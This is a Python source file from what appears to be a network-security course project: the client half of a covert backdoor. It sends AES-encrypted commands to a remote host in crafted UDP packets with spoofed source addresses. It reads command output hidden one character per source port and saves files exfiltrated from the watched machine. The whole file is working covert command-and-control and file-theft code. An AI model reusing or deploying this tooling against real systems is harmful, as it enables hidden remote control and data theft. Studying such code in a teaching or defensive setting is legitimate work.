##################################################################################
##  SOURCE FILE:    client.py
##
##  AUTHOR:         Geoff Dabu, Ben Kim
##
##  PROGRAM:
##
##
##  FUNCTIONS:      stopfilter(packet)
##                  main()
##                  sendCommandLoop
##
##  DATE:           October 17, 2015
##
##################################################################################
import sys, os, argparse, socket, logging, threading, sys
from scapy.all import *
from AesEncryption import *

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
sema1 = threading.BoundedSemaphore(value=1)
message = []
fileMessage = []

##################################################################################
##  FUNCTION
##
##  Name:           stopfilter
##  Parameters:     packet - a packet that is passed in through sniffed
##  Return Values:  boolean - true, if sniff function ends. false, if sniff
##                  function continues.
##  Description:    Determines whether the client continues to sniff for packets.
##                  The client only continues if there is a pkt with payload.
##################################################################################
def stopfilter(pkt):
    global message, fileMessage

    if ARP in pkt:
        return 

    # if pkt[IP].options != '\x83\x03\x10':
    #   return 

    if pkt.haslayer(IP):
        if pkt["IP"].id != 7777:
            return

    if UDP in pkt:

        if pkt['UDP'].dport == 8000:

            if pkt['UDP'].sport != 128:
                message.append(pkt['UDP'].sport)
                return

            if pkt['UDP'].sport == 128:
                secret = ""
                for m in message:
                    secret += chr(m)

                print decrypt(secret)

                secret = ""
                message = []
                sema1.release()
                return 

        elif pkt['UDP'].dport == 7000:
            
            if pkt['UDP'].sport != 128:
            
                fileMessage.append(pkt['UDP'].sport)
            
                return 

            if pkt['UDP'].sport == 128:

                fileString = ""
                
                for m in fileMessage:
                    fileString += chr(m)

                secretFileName = decrypt(pkt['Raw'].load)
                secretFile = open(secretFileName, 'w')
                secretFile.write(decrypt(fileString))
                secretFile.close()

                fileString = ""
                fileMessage = []

                print "%s Update\n***New input: " % secretFileName
            
                return 

##################################################################################
##  FUNCTION
##
##  Name:           sendCommandLoop
##  Parameters:     args - command line arguments
##  Return Values:  N/A
##  Description:    Continually prompts and sends packets with a command
##################################################################################
def sendCommandLoop(args):
    while 1:
        sema1.acquire()
        payload = raw_input("***New input: \n")
        pkt = IP(dst=args.dstIp, src=args.srcIp, id=7777)/UDP(dport=int(args.dstPort), sport=8000)/encrypt(payload)
        send(pkt)


##################################################################################
##  FUNCTION
##
##  Name:           main
##  Parameters:     n/a
##  Return Values:  n/a
##  Description:    Prompts the user for a command, encrypts it and sends it to
##                  the server.
##################################################################################
def main():


    cmdParser = argparse.ArgumentParser(description="COMP8505 Final Project - Client")
    cmdParser.add_argument('-d','--dstIp',dest='dstIp', help='Destination address of the host to send the message to.', required=True)
    cmdParser.add_argument('-s','--srcIp',dest='srcIp', help='Source address of the host thats sending.', required=True)
    cmdParser.add_argument('-p','--dstPort',dest='dstPort', help='Destination port of the host to send the message to.', required=True)
    cmdParser.add_argument('-f','--fileDirectory',dest='fileDir', help='File Directory to watch a file', required=True)
    args = cmdParser.parse_args();

    pkt = IP(dst=args.dstIp, src=args.srcIp, id=7777)/UDP(dport=22, sport=8000)/encrypt(args.fileDir)
    send(pkt)

    t1 = threading.Thread(name="sendCommandLoop", target=sendCommandLoop, args=[args])
    t1.start()

    
    sniff(filter="udp and (dst port 8000 or dst port 7000)", prn=stopfilter)

    t1.join()



if __name__ == '__main__':
    main()
